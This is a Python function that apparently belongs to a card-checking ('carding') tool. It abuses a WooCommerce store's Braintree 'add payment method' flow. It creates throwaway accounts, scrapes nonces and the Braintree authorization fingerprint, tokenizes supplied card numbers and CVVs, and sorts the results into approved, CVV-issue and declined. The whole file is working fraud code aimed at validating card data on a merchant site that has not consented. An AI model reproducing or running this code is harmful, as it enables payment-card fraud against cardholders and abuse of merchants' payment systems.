async def braintree_auth_check(cc, mm, yy, cvv):
    """
    Check card via Braintree auth (add payment method).
    Returns: (result_type, details)
    """
    try:
        import re
        import base64
        
        connector = aiohttp.TCPConnector(ssl=False, limit=5)
        timeout = aiohttp.ClientTimeout(total=60)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
            }
            
            # Step 1: Get registration page
            async with session.get(f'{B3_AUTH_SITE}/my-account/', headers=headers) as resp:
                html = await resp.text()
            
            nonce_match = re.search(r'name=["\']woocommerce-register-nonce["\']\s+value=["\']([^"\']+)["\']', html)
            if not nonce_match:
                return 'error', 'Site unavailable'
            reg_nonce = nonce_match.group(1)
            
            # Step 2: Register
            username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12))
            email = f"{username}@gmail.com"
            
            reg_data = {
                'username': username,
                'email': email,
                'password': 'TestPass123!@#',
                'woocommerce-register-nonce': reg_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            
            async with session.post(f'{B3_AUTH_SITE}/my-account/', headers=headers, data=reg_data) as resp:
                html = await resp.text()
            
            if 'logout' not in html.lower() and 'dashboard' not in html.lower():
                if 'already registered' in html.lower():
                    pass  # Might still work
                else:
                    return 'error', 'Registration failed'
            
            # Step 3: Get add payment method page
            async with session.get(f'{B3_AUTH_SITE}/my-account/add-payment-method/', headers=headers) as resp:
                html = await resp.text()
            
            add_nonce_match = re.search(r'name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([^"\']+)["\']', html)
            if not add_nonce_match:
                return 'error', 'Payment page unavailable'
            add_nonce = add_nonce_match.group(1)
            
            # Find Braintree client token nonce
            client_match = re.search(r'client_token_nonce":"([^"]+)"', html)
            if not client_match:
                return 'error', 'Braintree not found'
            client_nonce = client_match.group(1)
            
            # Step 4: Get Braintree token
            ajax_data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': client_nonce,
            }
            
            async with session.post(f'{B3_AUTH_SITE}/wp-admin/admin-ajax.php', headers=headers, data=ajax_data) as resp:
                try:
                    token_json = await resp.json()
                    enc_token = token_json.get('data')
                    if not enc_token:
                        return 'error', 'No Braintree token'
                except:
                    return 'error', 'Token request failed'
            
            # Decode token
            dec_token = base64.b64decode(enc_token).decode('utf-8')
            auth_match = re.search(r'"authorizationFingerprint":"(.*?)"', dec_token)
            if not auth_match:
                return 'error', 'No authorization'
            auth_fp = auth_match.group(1)
            
            # Step 5: Tokenize card via Braintree GraphQL
            bt_headers = {
                'authorization': f'Bearer {auth_fp}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
            }
            
            bt_json = {
                'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': str(uuid.uuid4())},
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mm.zfill(2),
                            'expirationYear': yy if len(yy) == 4 else f'20{yy}',
                            'cvv': cvv,
                        },
                        'options': {'validate': False}
                    }
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            async with session.post('https://payments.braintree-api.com/graphql', headers=bt_headers, json=bt_json) as resp:
                try:
                    bt_result = await resp.json()
                    token = bt_result['data']['tokenizeCreditCard']['token']
                except:
                    return 'error', 'Tokenization failed'
            
            # Step 6: Submit payment method
            final_data = {
                'payment_method': 'braintree_credit_card',
                'wc_braintree_credit_card_payment_nonce': token,
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': add_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }
            
            async with session.post(f'{B3_AUTH_SITE}/my-account/add-payment-method/', headers=headers, data=final_data) as resp:
                html = await resp.text()
            
            html_lower = html.lower()
            
            if 'nice' in html_lower or 'payment method successfully added' in html_lower or 'new payment method added' in html_lower:
                return 'approved', "Card Approved"
            elif 'duplicate card' in html_lower:
                return 'approved', "Approved (Duplicate)"
            elif 'insufficient funds' in html_lower:
                return 'approved', "Insufficient Funds"
            elif 'card issuer declined cvv' in html_lower or 'cvv' in html_lower:
                return 'ccn', "CCN: CVV Issue"
            elif 'do not honor' in html_lower:
                return 'declined', "Do Not Honor"
            elif 'invalid card' in html_lower or 'invalid number' in html_lower:
                return 'declined', "Invalid Card"
            elif 'expired' in html_lower:
                return 'declined', "Expired Card"
            else:
                # Try to extract error message
                error_match = re.search(r'class=["\']woocommerce-error["\'][^>]*>([^<]+)', html)
                if error_match:
                    return 'declined', error_match.group(1)[:50]
                return 'declined', "Unknown decline"
                    
    except asyncio.TimeoutError:
        return 'error', 'Timeout'
    except Exception as e:
        return 'error', str(e)[:50]


